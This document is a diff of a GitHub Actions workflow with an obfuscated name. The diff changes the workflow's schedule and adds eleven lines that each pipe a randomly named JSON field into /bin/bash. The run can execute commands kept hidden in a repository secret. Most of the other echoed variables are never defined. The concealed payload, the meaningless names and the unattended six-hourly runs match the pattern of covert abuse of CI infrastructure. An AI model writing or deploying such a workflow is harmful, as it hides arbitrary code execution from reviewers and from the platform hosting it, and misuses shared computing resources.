@@ -1,22 +1,28 @@
 name: chenzhishi4567
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '39 5/6 * * *'
+    - cron: '6 5/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: chenzhishi4567
         env:
-          v4: ${{ secrets.v4 }}
+          d28: ${{ secrets.d28 }}
         run: |
-          echo $v4 | jq -r .iy1422 | /bin/bash
-          echo $s426 | jq -r .p6 | /bin/bash
-          echo $mqwwc0628 | jq -r .wboix3 | /bin/bash
-          echo $ojk830 | jq -r .iqq011 | /bin/bash
-          echo $wk33 | jq -r .ckmni15523 | /bin/bash
+          echo $d28 | jq -r .qlund009 | /bin/bash
+          echo $vil8314 | jq -r .tjx75 | /bin/bash
+          echo $aqw73358 | jq -r .wtg700 | /bin/bash
+          echo $bmdkh5239 | jq -r .jjp264 | /bin/bash
+          echo $mfi320 | jq -r .kyj5 | /bin/bash
+          echo $qkcj5 | jq -r .dryme91195 | /bin/bash
+          echo $xrwqg72 | jq -r .x97 | /bin/bash
+          echo $hg791 | jq -r .buro755 | /bin/bash
+          echo $dlt70783 | jq -r .hcino09084 | /bin/bash
+          echo $bvgra29 | jq -r .zhfm7 | /bin/bash
+          echo $g6 | jq -r .rkys96 | /bin/bash
 
